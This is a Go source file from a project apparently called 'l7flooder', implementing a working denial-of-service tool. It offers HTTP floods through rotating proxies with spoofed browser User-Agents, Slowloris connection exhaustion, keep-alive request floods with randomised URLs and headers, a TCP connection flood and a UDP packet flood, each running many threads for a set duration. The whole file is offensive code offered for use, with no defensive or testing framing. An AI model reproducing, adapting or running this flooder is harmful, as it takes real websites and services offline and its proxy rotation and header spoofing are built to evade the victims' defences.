package attack

import (
	"crypto/tls"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
	"l7flooder/internal/metrics"
	"l7flooder/internal/proxy"
	"l7flooder/internal/utils"
)

func StartAttack(target string, threads, duration int, proxyPath, method, headerStr string, m *metrics.Metrics) {
	modes := strings.Split(strings.ToUpper(method), ",")
	for _, mode := range modes {
		if mode == "SLOWLORIS" {
			startSlowloris(target, threads, duration, headerStr, m)
			return
		}
		if mode == "KEEPALIVE" {
			startKeepAlive(target, threads, duration, headerStr, m)
			return
		}
		if mode == "L4SYN" {
			startL4SYN(target, threads, duration, m)
			return
		}
		if mode == "L4UDP" {
			startL4UDP(target, threads, duration, m)
			return
		}
	}
	var proxyManager *proxy.ProxyManager
	var err error
	if proxyPath != "" {
		proxyManager, err = proxy.NewProxyManager(proxyPath)
		if err != nil {
			panic(err)
		}
	}
	headers := utils.ParseHeaders(headerStr)
	var wg sync.WaitGroup
	stop := make(chan struct{})
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			client := buildClient(proxyManager)
			for {
				select {
				case <-stop:
					return
				default:
					start := time.Now()
					req, _ := http.NewRequest(method, target, nil)
					for k, v := range headers {
						req.Header.Set(k, v)
					}
					if _, ok := headers["User-Agent"]; !ok {
						req.Header.Set("User-Agent", randomUA())
					}
					resp, err := client.Do(req)
					latency := time.Since(start)
					if err == nil {
						ioutil.ReadAll(resp.Body)
						resp.Body.Close()
						m.Add(resp.StatusCode >= 200 && resp.StatusCode < 400, latency)
					} else {
						m.Add(false, latency)
					}
				}
			}
		}()
	}
	ticker := time.NewTicker(1 * time.Second)
	end := time.After(time.Duration(duration) * time.Second)
	for {
		select {
		case <-end:
			close(stop)
			wg.Wait()
			return
		case <-ticker.C:
			m.Print()
		}
	}
}

func buildClient(pm *proxy.ProxyManager) *http.Client {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	if pm != nil {
		tr.Proxy = func(_ *http.Request) (*url.URL, error) {
			proxyStr := pm.Next()
			if proxyStr == "" {
				return nil, nil
			}
			if !strings.HasPrefix(proxyStr, "http") {
				proxyStr = "http://" + proxyStr
			}
			return url.Parse(proxyStr)
		}
	}
	return &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second,
	}
}

func randomUA() string {
	uas := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
	}
	return uas[rand.Intn(len(uas))]
}

func startSlowloris(target string, threads, duration int, headerStr string, metrics *metrics.Metrics) {
	u, err := url.Parse(target)
	if err != nil {
		panic(err)
	}
	host := u.Host
	if !strings.Contains(host, ":") {
		if u.Scheme == "https" {
			host += ":443"
		} else {
			host += ":80"
		}
	}
	headers := utils.ParseHeaders(headerStr)
	var wg sync.WaitGroup
	stop := make(chan struct{})
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			var conn net.Conn
			for {
				select {
				case <-stop:
					if conn != nil {
						conn.Close()
					}
					return
				default:
					if conn == nil {
						if u.Scheme == "https" {
							conn, err = tls.Dial("tcp", host, &tls.Config{InsecureSkipVerify: true})
						} else {
							conn, err = net.Dial("tcp", host)
						}
						if err != nil {
							time.Sleep(2 * time.Second)
							continue
						}
						// send start requestt
						req := "GET " + u.RequestURI() + " HTTP/1.1\r\n"
						req += "Host: " + u.Hostname() + "\r\n"
						for k, v := range headers {
							req += k + ": " + v + "\r\n"
						}
						conn.Write([]byte(req))
					}
					// every 10 sec send header
					conn.Write([]byte("X-a: " + randomString(8) + "\r\n"))
					metrics.Add(true, 0)
					select {
					case <-stop:
						return
					case <-time.After(10 * time.Second):
					}
				}
			}
		}()
	}
	ticker := time.NewTicker(1 * time.Second)
	end := time.After(time.Duration(duration) * time.Second)
	for {
		select {
		case <-end:
			close(stop)
			wg.Wait()
			return
		case <-ticker.C:
			metrics.Print()
		}
	}
}

func randomString(n int) string {
	letters := []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func startKeepAlive(target string, threads, duration int, headerStr string, metrics *metrics.Metrics) {
	headers := utils.ParseHeaders(headerStr)
	var wg sync.WaitGroup
	stop := make(chan struct{})
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			client := &http.Client{Timeout: 30 * time.Second}
			for {
				select {
				case <-stop:
					return
				default:
					for j := 0; j < 1000; j++ { // 1000 запросов по одному соединению
						req, _ := http.NewRequest("GET", utils.RandomizeURL(target), nil)
						for k, v := range utils.RandomizeHeaders(headers) {
							req.Header.Set(k, v)
						}
						req.Header.Set("Connection", "keep-alive")
						start := time.Now()
						resp, err := client.Do(req)
						latency := time.Since(start)
						if err == nil {
							ioutil.ReadAll(resp.Body)
							resp.Body.Close()
							metrics.Add(resp.StatusCode >= 200 && resp.StatusCode < 400, latency)
						} else {
							metrics.Add(false, latency)
						}
					}
				}
			}
		}()
	}
	ticker := time.NewTicker(1 * time.Second)
	end := time.After(time.Duration(duration) * time.Second)
	for {
		select {
		case <-end:
			close(stop)
			wg.Wait()
			return
		case <-ticker.C:
			metrics.Print()
		}
	}
}

func startL4SYN(target string, threads, duration int, metrics *metrics.Metrics) {
	host, port := parseHostPort(target)
	var wg sync.WaitGroup
	stop := make(chan struct{})
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-stop:
					return
				default:
					conn, err := net.Dial("tcp", net.JoinHostPort(host, port))
					if err == nil {
						conn.Close()
						metrics.Add(true, 0)
					} else {
						metrics.Add(false, 0)
					}
				}
			}
		}()
	}
	ticker := time.NewTicker(1 * time.Second)
	end := time.After(time.Duration(duration) * time.Second)
	for {
		select {
		case <-end:
			close(stop)
			wg.Wait()
			return
		case <-ticker.C:
			metrics.Print()
		}
	}
}

func startL4UDP(target string, threads, duration int, metrics *metrics.Metrics) {
	host, port := parseHostPort(target)
	addr, err := net.ResolveUDPAddr("udp", net.JoinHostPort(host, port))
	if err != nil {
		panic(err)
	}
	var wg sync.WaitGroup
	stop := make(chan struct{})
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.DialUDP("udp", nil, addr)
			if err != nil {
				return
			}
			buf := make([]byte, 1024)
			rand.Read(buf)
			for {
				select {
				case <-stop:
					return
				default:
					conn.Write(buf)
					metrics.Add(true, 0)
				}
			}
		}()
	}
	ticker := time.NewTicker(1 * time.Second)
	end := time.After(time.Duration(duration) * time.Second)
	for {
		select {
		case <-end:
			close(stop)
			wg.Wait()
			return
		case <-ticker.C:
			metrics.Print()
		}
	}
}

func parseHostPort(target string) (string, string) {
	u, err := url.Parse(target)
	if err != nil {
		return target, "80"
	}
	host := u.Hostname()
	port := u.Port()
	if port == "" {
		if u.Scheme == "https" {
			port = "443"
		} else {
			port = "80"
		}
	}
	return host, port
}
